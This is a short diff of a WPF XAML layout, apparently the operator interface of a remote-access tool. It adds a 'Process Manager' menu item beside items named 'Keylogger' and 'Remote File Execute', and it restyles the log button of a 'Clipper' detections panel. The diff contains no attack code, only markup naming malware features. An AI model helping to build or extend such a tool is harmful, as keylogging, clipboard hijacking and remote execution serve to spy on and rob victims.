@@ -611,6 +611,7 @@
                                         <MenuItem Header="TCP Manager"           Click="TcpManager_Click">          <MenuItem.Icon><TextBlock Text="⇄"   FontSize="13" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
                                         <MenuItem Header="Startup Manager"       Click="StartupManager_Click">      <MenuItem.Icon><TextBlock Text="🚀"  FontSize="11"/></MenuItem.Icon></MenuItem>
                                         <MenuItem Header="Fun"                   Click="Fun_Click">                 <MenuItem.Icon><TextBlock Text="🎮"  FontSize="11"/></MenuItem.Icon></MenuItem>
+                                        <MenuItem Header="Process Manager"       Click="ProcessManager_Click">      <MenuItem.Icon><TextBlock Text="⚙"  FontSize="11" Foreground="#4A85F5"/></MenuItem.Icon></MenuItem>
                                         <MenuItem Header="Keylogger"             Click="Keylogger_Click">           <MenuItem.Icon><TextBlock Text="⌨"  FontSize="11" Foreground="#cba6f7"/></MenuItem.Icon></MenuItem>
                                         <Separator />
                                         <MenuItem Header="Remote File Execute"   Click="RemoteFileExec_Click">      <MenuItem.Icon><TextBlock Text="⚡"  FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
@@ -1635,8 +1636,8 @@
                                 <Grid Margin="0,0,0,8">
                                     <TextBlock Text="DETECTIONS" FontSize="9" FontWeight="Bold"
                                                Foreground="#C0a6e3a1" FontFamily="Consolas" VerticalAlignment="Center"/>
-                                    <Button Content="Clear" Width="56" Height="26" HorizontalAlignment="Right"
-                                            Style="{StaticResource SBtn}" Click="ClipperClearLog_Click"/>
+                                    <Button Content="Clear log" Height="26" Padding="12,0" HorizontalAlignment="Right"
+                                            Style="{StaticResource SBtn}" FontSize="11" Click="ClipperClearLog_Click"/>
                                 </Grid>
                                 <Border Background="#05060E" CornerRadius="4" Height="150">
                                     <ScrollViewer x:Name="ClipperLogScroll" VerticalScrollBarVisibility="Auto">
